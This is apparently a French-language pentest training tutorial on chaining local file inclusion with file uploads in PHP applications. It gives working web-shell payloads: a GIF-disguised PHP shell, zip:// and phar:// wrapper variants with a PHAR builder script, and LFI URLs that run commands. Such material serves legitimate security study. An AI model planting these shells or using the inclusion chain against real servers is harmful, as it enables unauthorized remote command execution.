# LFI and File Uploads

### <mark style="color:blue;">**Exploitation des Téléchargements de Fichiers**</mark>

Le module d’attaques sur le téléchargement de fichiers couvre différentes techniques permettant d’exploiter des formulaires ou des fonctionnalités de téléchargement. Cependant, pour l’attaque que nous allons discuter ici, **le formulaire de téléchargement n’a pas besoin d’être vulnérable**, il doit seulement permettre le téléchargement de fichiers.

Si la fonction vulnérable dans le code backend permet l'exécution de code, alors le contenu du fichier que nous téléchargeons sera exécuté, peu importe son extension ou son type. Par exemple, nous pouvons télécharger un fichier image (par exemple `image.jpg`) contenant un code PHP (au lieu de données d'image). Si ce fichier est inclus via une vulnérabilité LFI, le code PHP sera exécuté, donnant ainsi un accès à distance au serveur.

***

#### <mark style="color:green;">**Fonctions et exécution du code**</mark>

Les fonctions suivantes permettent d’exécuter du code via une inclusion de fichier. Ces fonctions peuvent être utilisées pour l'attaque décrite dans cette section :

| Fonction PHP                  | Lire le contenu | Exécuter | URL distante |
| ----------------------------- | --------------- | -------- | ------------ |
| **include()/include\_once()** | ✅               | ✅        | ✅            |
| **require()/require\_once()** | ✅               | ✅        | ❌            |

***

### <mark style="color:blue;">**Téléchargement d'images et inclusion LFI**</mark>

Les téléchargements d'images sont très courants dans les applications web modernes. Ils sont généralement considérés comme sûrs lorsque la fonction de téléchargement est correctement sécurisée. Cependant, dans ce cas, la vulnérabilité ne réside pas dans le formulaire de téléchargement, mais dans la **fonctionnalité d'inclusion de fichiers**.

<mark style="color:green;">**Création d'une Image Malveillante**</mark>

Le premier objectif est de créer une image malveillante contenant un code PHP tout en restant reconnue comme une image. Voici comment procéder :

1. Utilisez une extension d'image autorisée (par exemple `shell.gif`).
2. Ajoutez les "magic bytes" de l'image (par exemple `GIF8`) au début du fichier pour imiter une vraie image.
3. Ajoutez ensuite le code PHP malveillant.

Commande pour créer le fichier malveillant :

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

**Étapes :**

1. **Téléchargez l'image malveillante** : Accédez à la page de paramètres du profil et téléchargez l'image en tant qu'avatar (par exemple `shell.gif`).
2.  **Obtenez le chemin d'accès** : Après le téléchargement, inspectez le code source de la page pour trouver le chemin du fichier. Par exemple :

    ```html
    <img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
    ```

    Le chemin serait donc `/profile_images/shell.gif`.
3.  **Exploitez la vulnérabilité LFI** : Utilisez la vulnérabilité LFI pour inclure le fichier malveillant et exécuter une commande :

    ```bash
    http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
    ```

    Si exploitable, le serveur renverra le résultat de la commande, par exemple :

    ```
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

***

### <mark style="color:blue;">**Téléchargement de fichiers ZIP**</mark>

Si l'approche précédente ne fonctionne pas, vous pouvez utiliser le wrapper **zip** (s'il est activé sur le serveur).

**Création d'un fichier ZIP malveillant :**

1.  Créez un fichier PHP avec un code malveillant :

    ```bash
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    ```
2.  Compressez le fichier PHP dans une archive ZIP :

    ```bash
    zip shell.jpg shell.php
    ```

    **Note** : Vous pouvez donner une extension `.jpg` au fichier ZIP pour contourner certains contrôles basés sur l'extension.

**Inclusion via LFI :**

1. Téléchargez le fichier ZIP (`shell.jpg`).
2.  Incluez le fichier avec le wrapper **zip://** en précisant le chemin interne du fichier compressé (`#shell.php`) :

    {% code overflow="wrap" fullWidth="true" %}
    ```bash
    http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
    ```
    {% endcode %}
3. Résultat attendu : Commande exécutée avec succès.

***

### <mark style="color:blue;">**Téléchargement de fichiers PHAR**</mark>

Le wrapper **phar** peut également être utilisé pour exécuter du code malveillant :

<mark style="color:green;">**Création d'un fichier PHAR malveillant :**</mark>

1.  Créez un script PHP pour générer un fichier PHAR :

    ```php
    <?php
    $phar = new Phar('shell.phar');
    $phar->startBuffering();
    $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    $phar->stopBuffering();
    ```
2.  Exécutez ce script pour générer un fichier PHAR et renommez-le avec une extension `.jpg` :

    ```bash
    php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
    ```

**Inclusion via LFI :**

1. Téléchargez le fichier PHAR (`shell.jpg`).
2.  Incluez-le avec le wrapper **phar://** :

    {% code overflow="wrap" fullWidth="true" %}
    ```bash
    http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
    ```
    {% endcode %}
3. Résultat attendu : Commande exécutée avec succès.

***
